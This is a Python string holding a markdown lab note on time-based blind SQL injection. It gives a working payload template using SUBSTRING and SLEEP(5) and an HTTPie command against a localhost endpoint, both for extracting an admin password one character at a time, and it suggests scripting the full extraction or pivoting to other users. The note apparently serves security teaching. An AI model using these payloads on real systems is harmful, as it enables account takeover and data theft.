markdown_note = textwrap.dedent("""
    # 🔐 Blind SQLi: Password Extraction (Time-Based)

    ## 🎯 Objective
    Extract the password of a known user (`admin`) by leveraging time-based SQL injection.

    ## 📤 Payload Template
    ```sql
    admin' AND BINARY SUBSTRING(password, {pos}, 1) = '{char}' AND SLEEP(5)-- 
    ```

    - `SUBSTRING(password, {pos}, 1)`: Checks a single character at position `{pos}`
    - `SLEEP(5)`: Causes a delay if the condition is true

    ## 📥 HTTPie Example
    ```bash
    http --form POST http://localhost:5000/blind username="admin' AND BINARY SUBSTRING(password, 1, 1) = 'a' AND SLEEP(5)--"
    ```

    ## 📋 Expected Behavior
    - If character is correct → response takes ~5s
    - If incorrect → response is instant
    - Repeat loop until full password is discovered or no characters match

    ## 🧠 What We Learn
    - How inference through timing reveals protected data
    - How precise payload crafting and response measurement enable blind attacks

    ## ✅ Next Step
    - Use script to fully extract password
    - Expand to extract email or pivot to another user
""")